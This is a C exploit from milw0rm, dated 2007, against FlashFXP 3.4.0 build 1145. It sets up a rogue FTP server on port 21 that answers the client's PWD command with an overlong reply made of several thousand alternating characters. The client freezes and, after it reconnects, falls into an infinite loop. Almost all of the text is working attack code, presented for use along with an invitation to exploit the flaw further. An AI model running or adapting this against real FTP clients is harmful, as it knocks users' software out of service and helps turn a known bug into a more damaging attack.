/***************************************************************************
*           FlashFXP V 3.4.0 build 1145 Buffer Overflow DoS                *
*                                                                          *
*                                                                          *
* There's a strange bug in FlashFXP.                                       *
* When sending a long PWD command with more than 5420 \ separated by at    *
* least one different char, it is possible to make the app unstable.       *
* It will first freeze during 45s consuming 100% resources, and then, if   *
* the user hits disconnect and then reconnects to the server it will enter *
* in an infinite loop trying to put data on the stack.                     *
*                                                                          *
*                                                                          *
* I admit it is a little bit tricky but maybe someone will find a better   *
* way to exploit this vuln.                                                *
*                                                                          *
* Have Fun!                                                                *
*                                                                          *
* Coded by Marsu <Marsupilamipowa@hotmail.fr>                              *
***************************************************************************/



#include "winsock2.h"
#include "stdio.h"
#include "stdlib.h"
#include "windows.h"
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	char recvbuff[1024];
	char evilbuff[11000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &wsaData);

	int n=1;
	while (n<=2)
	{
		server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sin.sin_family = PF_INET;
		sin.sin_addr.s_addr = htonl(INADDR_ANY);
		sin.sin_port = htons( 21 );
		bind(server,(SOCKADDR*)&sin,sizeof(sin));
		printf("[*] Listening on port 21...\n");
		listen(server,5);
		printf("[*] Waiting for client ...\n");
		client=accept(server,NULL,NULL);
		printf("[+] Client connected\n");


		memcpy(evilbuff,"220 Hello there\r\n\0",18);
		memset(recvbuff,'\0',1024);

		if (send(client,evilbuff,strlen(evilbuff),0)==-1)
		{
			printf("[-] Error in send!\n");
			exit(-1);
		}

		//USER
		recv(client,recvbuff,1024,0);
		printf("%s", recvbuff);
		memcpy(evilbuff,"331 \r\n\0",7);
		send(client,evilbuff,strlen(evilbuff),0);
		Sleep(50);

		//PASS
		recv(client,recvbuff,1024,0);
		printf("%s", recvbuff);
		memcpy(evilbuff,"230 \r\n\0",7);
		send(client,evilbuff,strlen(evilbuff),0);

		//SYST
		memset(recvbuff,'\0',1024);
		recv(client,recvbuff,1024,0);
		printf("%s", recvbuff);
		memcpy(evilbuff,"215 WINDOWS\r\n\0",14);
		send(client,evilbuff,strlen(evilbuff),0);

		//FEAT
		recv(client,recvbuff,1024,0);
		printf("%s", recvbuff);
		memcpy(evilbuff,"211 END\r\n\0",10);
		send(client,evilbuff,strlen(evilbuff),0);

		//PWD
		int i=5;
		recv(client,recvbuff,1024,0);
		printf("%s", recvbuff);
		while (i<10840) {
			memset(evilbuff+i,'a',1);
			i++;
			memset(evilbuff+i,'//',1);
			i++;
		}
		memcpy(evilbuff,"257 \"",5);
		memcpy(evilbuff+10840,"\"\r\n\0",4);
		send(client,evilbuff,strlen(evilbuff),0);
		closesocket(client);
		closesocket(server);
		client=server=NULL;

		if (n<2) {
			printf("[+] Now FlashFXP is out for 45sec.\n");
			printf("[+] Note that user MUST click on disconnect and then reconnect\n  
   to trigger the bug.\n\n");
		}
		n++;
	}
	Sleep(2000);
	printf("\n[+] FlashFXP must be DoSed\n");
	return 0;
}

// milw0rm.com [2007-02-06]